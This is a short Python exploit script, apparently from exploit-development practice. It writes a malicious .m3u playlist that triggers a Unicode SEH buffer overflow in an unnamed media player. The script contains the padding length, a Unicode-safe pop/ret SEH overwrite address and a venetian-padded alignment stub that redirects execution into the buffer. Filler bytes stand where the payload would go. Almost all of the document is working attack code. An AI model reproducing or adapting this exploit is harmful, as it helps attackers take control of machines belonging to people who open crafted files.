#mona seh -cp unicode
# pop ebx # ret 0x04 | 0x004100f2 #use "\xf2\x41" for expansion 
#no short jump unicode, so instrutions that won't truncate buffer "\x41\x71"
align = (
"\x53"               #push EBX
"\x71"               #unicode nop, venetian padding
"\x58"               #pop EAX
"\x71"               #unicode nop, venetian padding
"\x05\x07\x11"       #add eax,0x1100700  \
"\x71"               #unicode nop(vp) |> +600 to EAX
"\x2d\x01\x11"       #sub eax,0x1100100  /
"\x71"               #unicode nop, venetian padding
"\x50"               #push EAX onto the stack (points to our buffer)
"\x71"               #unicode nop, venetian padding
"\xC3")              #RETN


buffer = "A"*536 + "\x71\x41" +"\xf2\x41" + align + "X" * 2864
f = open('file7.m3u','w')
f.write(buffer)
f.close()
